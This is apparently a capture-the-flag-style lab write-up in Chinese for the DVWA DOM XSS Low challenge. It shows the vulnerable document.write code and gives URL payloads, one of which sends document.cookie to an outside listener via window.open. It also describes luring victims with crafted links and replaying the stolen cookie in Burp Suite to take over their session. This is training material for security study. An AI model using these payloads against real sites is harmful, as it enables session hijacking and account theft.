# XSS (DOM) - Low

## View Source

```PHP
<?php

# No protections, anything goes

?> 
```

### View Page Source

```HTML
<form name="XSS" method="GET">
    <select name="default">
        <script>
            if (document.location.href.indexOf("default=") >= 0) {
                var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
                document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
                document.write("<option value='' disabled='disabled'>----</option>");
            }
                
            document.write("<option value='English'>English</option>");
            document.write("<option value='French'>French</option>");
            document.write("<option value='Spanish'>Spanish</option>");
            document.write("<option value='German'>German</option>");
        </script>
    </select>
    <input type="submit" value="Select" />
</form>
```

## Code Review

- 使用前端 *JavaScript* 的 *document.write()* 來動態產生下拉式選單選項
- *lang* 為將 *default=* 後面接的參數切割出來，並做 *decodeURI*

## Answer

- 原本的網址 `http://127.0.0.1/vulnerabilities/xss_d/`
- 選擇 *English* 後的網址 `http://127.0.0.1/vulnerabilities/xss_d/?default=English`
    - 假的，不會真的因為選不同就有不同語言
- 需要搭配社交工程等方法，將構造好的惡意連結誘騙受害者點擊或載入
    - `alert()` 是一個常用的 *XSS PoC*

### Example

```
http://127.0.0.1/vulnerabilities/xss_d/?default=<script>alert(1)</script>
http://127.0.0.1/vulnerabilities/xss_d/?default=<script>alert(document.cookie)</script>
http://127.0.0.1/vulnerabilities/xss_d/?default=<script>window.open("http://0.0.0.0:8000/?cookie=" + document.cookie)</script>
```

- 結果
```HTML
<option value="%3Cscript%3Ealert(1)%3C/script%3E">
    <script>alert(1)</script>
</option>
```

### Note

- 可以使用 *Burp Suite* 的 *Proxy* 來修改發送的 *request* 封包，將 *Cookie* 替換成透過 *XSS* 得到的受害者 *Cookie*，就能直接以受害者的身分使用網站服務，不用進行登入